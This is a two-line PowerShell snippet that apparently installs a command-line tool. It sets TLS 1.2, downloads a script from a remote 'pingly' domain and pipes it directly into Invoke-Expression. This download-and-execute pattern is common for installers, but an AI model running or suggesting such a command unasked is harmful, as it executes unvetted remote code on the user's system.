[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iwr -useb "https://pingly.ktexucoder.online/cli.ps1" | iex
